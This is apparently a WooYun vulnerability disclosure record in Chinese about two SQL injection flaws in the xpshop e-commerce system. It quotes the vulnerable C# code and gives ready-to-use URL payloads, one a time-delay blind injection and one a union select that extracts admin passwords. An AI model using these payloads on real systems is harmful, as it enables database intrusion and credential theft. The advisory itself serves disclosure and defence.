{"id": 83722, "wybug_id": "wooyun-2015-0146945", "wybug_title": "xpshop网店系统sql注入两处（一处盲注）", "wybug_corp": "xpshop", "wybug_author": "不能忍", "wybug_date": "2015-10-22 17:34", "wybug_open_date": "2015-12-06 17:36", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "11", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-22：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-12-06：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  漏洞位置：**.**.**.**order\nprotected void Page_Load(object sender, EventArgs e)\t\t{\t\t\tif (base.CurrentUser != null && base.CurrentUser.Name != \"anonymous\")\t\t\t{\t\t\t\tthis.member = base.CurrentUser;\t\t\t\tthis.shipfree = new ShippingFreeDB().GetShippingFreeDetails(1);\t\t\t\tif (!base.IsPostBack)\t\t\t\t{\t\t\t\t\tif (base.Request.QueryString[\"type\"] != null && base.Request.QueryString[\"Action\"] != null)\t\t\t\t\t{\t\t\t\t\t\tstring text = base.Request.QueryString[\"Action\"];\t\t\t\t\t\tif (text != null)\t\t\t\t\t\t{\t\t\t\t\t\t\tif (!(text == \"GetSubArea\"))\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\tif (!(text == \"GetAddrDetail\"))\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\tif (!(text == \"GetZtds\"))\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\tif (!(text == \"GetShipps\"))\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\tif (!(text == \"GetShoppingCart\"))\t\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\tif (text == \"GetAdvancePayment\")\t\t\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t\tif (base.CurrentUser != null && base.CurrentUser.Name != \"anonymous\")\t\t\t\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t\t\tbase.Response.Write(base.CurrentUser.AdvancePayment);\t\t\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t\t\t\telse\t\t\t\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t\t\tbase.Response.Write(\"0\");\t\t\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t\telse\t\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\tShoppingCartDB shoppingCartDB = new ShoppingCartDB();\t\t\t\t\t\t\t\t\t\t\t\tSqlDataReader items = shoppingCartDB.GetItems(shoppingCartDB.GetShoppingCartId());\t\t\t\t\t\t\t\t\t\t\t\tstring s = XpShopJson.DrtToJSON(items, \"Cart\");\t\t\t\t\t\t\t\t\t\t\t\titems.Close();\t\t\t\t\t\t\t\t\t\t\t\tbase.Response.Write(s);\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\telse\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\tthis.GetShipps();\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\telse\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\tthis.GetZtds();\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t}\n还是这个函数this.GetZtds();：\nprivate void GetZtds()\t\t{\t\t\tSqlDataReader ztds = new ZtdDB().GetZtds2(base.Request.QueryString[\"AreaID\"]);\t\t\tstring s = XpShopJson.DrtToJSON(ztds, \"Ztd\");\t\t\tbase.Response.Write(s);\t\t}\n再跟进：\npublic SqlDataReader GetZtds2(string areaID)\t\t{\t\t\tstring cmdText = string.Concat(new string[]\t\t\t{\t\t\t\t\"SELECT * FROM Ztd WHERE \",\t\t\t\tUtils.dbo,\t\t\t\t\"f_GetShippingAreaNo(AreaID) Like (Cast(\",\t\t\t\tUtils.dbo,\t\t\t\t\"f_GetShippingAreaNo(\",\t\t\t\tareaID,\t\t\t\t\") As nvarchar(30)) + '%') ORDER BY ZtdID\"\t\t\t});\t\t\treturn XpShopDB.ExecuteReader(XpShopDB.ConnectionString, CommandType.Text, cmdText, null);\t\t}\n好像不回显的。没有过滤，直接进库给个payload：/comorder.aspx?type=1&action=GetZtds&AreaID=1) as nvarchar));waitfor delay '0:0:3'--第二处：\npublic int GetScore()\t\t{\t\t\treturn (this.config.MarkUnit == 1) ? ((int)this.orderDB.GetComTotal(base.CurrentUser.MemberID, this.GetOrderIDs(), \"Score\")) : 0;\t\t}\n跟进函数GetComTotal：\npublic DataTable GetComOrderPresents(int memberID, string orderIDs, string productID)\t\t{\t\t\tstring text = \"select ProductID,GiftID,PresentName,sum(PresentNum)/count(GiftID) as PresentNum,Ptype,count(GiftID) as Sum  from OrderPresent \";\t\t\tobject obj = text;\t\t\ttext = string.Concat(new object[]\t\t\t{\t\t\t\tobj,\t\t\t\t\" where \",\t\t\t\t(productID != \"0\") ? (\"ProductID = \" + productID + \" and \") : \"\",\t\t\t\t\" OrderID In (select OrderID from Orders where (Orders.Status = 0 or Orders.Status = 2 and PayType IN(5,6)) and MemberID = \",\t\t\t\tmemberID,\t\t\t\t\" and OrderID in (\",\t\t\t\torderIDs,\t\t\t\t\")) \"\t\t\t});\t\t\ttext += \"group by ProductID,GiftID,PresentName,Ptype\";\t\t\treturn XpShopDB.ExecuteDataTable(XpShopDB.ConnectionString, CommandType.Text, text, null);\t\t}\n同样没过滤。给个payload：/comorder.aspx?OrderID=1)) union select password from admin--   漏洞证明：  http://localhost/comorder.aspx?type=1&action=GetZtds&AreaID=1) as nvarchar));waitfor delay '0:0:3'--\n\n第二处：http://localhost/comorder.aspx?OrderID=1)) union select password from admin--\n\n   修复方案：  过滤   版权声明：转载请注明来源 不能忍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}